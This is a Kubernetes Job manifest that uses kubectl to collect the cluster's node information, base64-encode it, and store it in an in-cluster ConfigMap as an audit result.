apiVersion: batch/v1
kind: Job
metadata:
  name: audit-nodes-v70
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          NODES=$(kubectl get nodes -o json | base64 -w0);
          kubectl patch configmap dune-audit-result4 -n default --type merge
          -p "{\"data\":{\"nodes_b64\":\"$NODES\"}}";
          echo "DONE"